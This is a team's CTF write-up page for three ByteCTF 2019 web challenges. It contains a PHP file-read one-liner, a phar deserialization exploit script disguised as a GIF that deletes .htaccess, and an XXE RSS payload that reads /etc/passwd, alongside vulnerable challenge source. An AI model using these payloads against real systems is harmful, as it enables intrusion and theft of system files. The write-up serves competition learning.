<!DOCTYPE html>
<html>
  
<head>
  <meta charset="utf-8">
  <meta name="author" content="Suers" />
  
  
  <title>ByteCTF 2019 SU Write Up | su-team</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="ByteCTF," />
  

  
  <meta name="description" content="SU">

  

  

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
  

  

  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
    welcome: {"enable":false,"interval":30},
    start_time: "2018-02-10",
    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
    is_post: true,
    lock: false,
    author: "Suers",
    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
    mathjax: true,
    page_type: "",
    root: "/"
  };
</script>

  
<script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>


  
    <link rel="icon" href="/images/SU.ico">
    <link rel="apple-touch-icon" href="/images/SU.png">
  

  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  
<link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">


  
<meta name="generator" content="Hexo 6.3.0"></head>
  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">SU</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | Write ups of TEAM-SU</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首页</a>
      
        <a href="/archives/" target="_self">归档</a>
      
        <a href="/tags/" target="_self">标签</a>
      
        <a href="/about/" target="_self">关于</a>
      
        <a href="/links/" target="_self">成员</a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/team-su/" target="_blank" id="site-github">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
      <a href="javascript:void(0);" id="site-nav-btn">
        <i class="fa fa-ellipsis-v"></i>
      </a>
    </div>
  </div>
</header>
<nav class="table-content" id="site-nav">
  <div class="table-content-title">
    <span>导航</span>
  </div>
  <div class="table-content-main">
    <ol class="toc">
      
        <li class="toc-item">
          <a href="/" target="_self">
            首页
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/archives/" target="_self">
            归档
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/tags/" target="_self">
            标签
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/about/" target="_self">
            关于
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/links/" target="_self">
            成员
          </a>
        </li>
      
    </ol>
  </div>
</nav>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2019-09-14
    </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    ByteCTF 2019 SU Write Up
  </h1>
  
  <article class="passage-article">
    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="boring-code"><a href="#boring-code" class="headerlink" title="boring_code"></a>boring_code</h3><p>买了一个<code>aaaasdbaidu.com</code>的域名，即可绕过前面的 url 限制。<del>没错有钱你就可以打 CTF</del><br>然后在服务器上放<code>payload</code>就行了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">microtime</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">time</span>())))))))));</span><br></pre></td></tr></table></figure><br>dns 好了就直接爆破等时间就行了</p>
<h3 id="EzCMS"><a href="#EzCMS" class="headerlink" title="EzCMS"></a>EzCMS</h3><p>竟然抄了一下我们 suctf 的题…<br>前面有一个 hash 长度拓展攻击，有原题，只不过长度为8位，hashdump跑一下就行了。<br>题目意图非常明显，跟 SUCTF upload labs 2 差不多，php phar 反序列化触发函数是<code>mime_content_type</code>，使用<code>php://filter/read=convert.base64-encode/resource=</code>绕过正则限制，加一个 <code>ZipArchive-&gt;open</code> 删除 <code>.htaccess</code>就行了<br><a href="https://www.anquanke.com/post/id/95896">Insomni’hack Teaser 2018比赛Write Up：File Vault题目</a><br>然后随便上传一个 php 文件，删掉<code>.htaccess</code>之后就直接<br>构造 phar 的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filepath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_dir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content_check</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;/var/www/html/sandbox/9607fe6aa978f6811eb3fe830b544771/.htaccess&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&quot;9&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">// &lt;?php __HALT_COMPILER();</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;admin = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;checker = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h3><p><code>http://122.112.199.14:80,baidu.com:80/file</code> 逗号绕过 <code>url_parse</code>，vps 上放 xml ，可以任意读<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">title</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">title</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:atom</span>=<span class="string">&quot;http://www.w3.org/2005/Atom&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>先知安全技术社区<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/forum/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>先知安全技术社区<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">atom:link</span> <span class="attr">href</span>=<span class="string">&quot;http://xz.aliyun.com/forum/feed/&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;self&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">atom:link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">language</span>&gt;</span>zh-hans<span class="tag">&lt;/<span class="name">language</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/t/6223<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">description</span>&gt;</span>CVE-2018-14418 擦出新火花<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">guid</span>&gt;</span>http://xz.aliyun.com/t/6223<span class="tag">&lt;/<span class="name">guid</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure><br>php 伪协议读源码<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_erros&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;routes.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class_name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./classes/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./classes/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./controllers/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./controllers/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>routes.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;index.php&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="title class_">Index</span>::<span class="title function_ invoke__">createView</span>(<span class="string">&#x27;Index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;index&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="title class_">Index</span>::<span class="title function_ invoke__">createView</span>(<span class="string">&#x27;Index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;fetch&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title class_">Fetch</span>::<span class="title function_ invoke__">handleUrl</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;rss_in_order&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;order&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title class_">Admin</span>::<span class="title function_ invoke__">createView</span>(<span class="string">&#x27;Admin&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span> || <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;::1&#x27;</span>)&#123;</span><br><span class="line">        <span class="title class_">Admin</span>::<span class="title function_ invoke__">sort</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>],<span class="variable">$_REQUEST</span>[<span class="string">&#x27;order&#x27;</span>]);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;;(&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>Admin.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$order</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$rss</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$rss</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$rss</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./views/Admin.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Fetch.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fetch</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">handleUrl</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$invalidUrl</span> = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/aliyun\.com$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/baidu\.com$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/qq\.com$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123; </span><br><span class="line">            <span class="variable">$rss</span> = <span class="title class_">Rss</span>::<span class="title function_ invoke__">fetch</span>(<span class="variable">$url</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$invalidUrl</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./views/Fetch.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Rss.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rss</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">curl_request</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$post</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$cookie</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$headers</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$returnHeader</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_USERAGENT, <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_REFERER, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$post</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$post</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$cookie</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_COOKIE, <span class="variable">$cookie</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$headers</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_TIMEOUT, <span class="number">5</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">curl_errno</span>(<span class="variable">$curl</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">curl_error</span>(<span class="variable">$curl</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$header</span>, <span class="variable">$body</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\r\n\r\n&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$info</span>[<span class="string">&#x27;header&#x27;</span>] = <span class="variable">$header</span>;</span><br><span class="line">        <span class="variable">$info</span>[<span class="string">&#x27;body&#x27;</span>] = <span class="variable">$body</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$info</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="variable">$rss</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$rss</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$rss</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rss</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
